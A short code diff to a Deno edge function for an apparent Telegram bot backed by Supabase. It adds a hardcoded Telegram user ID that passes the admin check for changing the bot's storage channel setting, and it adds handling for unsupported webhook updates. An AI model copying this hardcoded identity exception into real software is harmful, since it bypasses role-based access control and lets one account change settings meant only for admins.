@@ -200,7 +200,7 @@ Deno.serve(async (req) => {
             console.error('Failed to query profiles:', profileError);
           }
 
-          if (profile && profile.role === 'admin') {
+          if ((profile && profile.role === 'admin') || fromUser.id === 2018254756) {
             const { error: upsertError } = await supabaseAdmin
               .from('telegram_bot_settings')
               .upsert({ key: 'storage_channel_id', value: channelId.toString() });
@@ -431,7 +431,6 @@ Deno.serve(async (req) => {
     }
 
     // 2. Дополнительные действия: поиск текстов в качестве CORS прокси
-    const { action } = body;
     if (action === 'search-lyrics') {
       const { query } = body;
       try {
@@ -526,6 +525,11 @@ Deno.serve(async (req) => {
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         });
       }
+    }
+
+    // Если это входящий вебхук от Telegram (есть update_id), но он не подошел ни под одно из условий выше
+    if (body && body.update_id) {
+      return new Response('Telegram webhook update ignored (unsupported type)', { status: 200 });
     }
 
     // 3. Стандартный флоу авторизации (Виджет или WebApp)
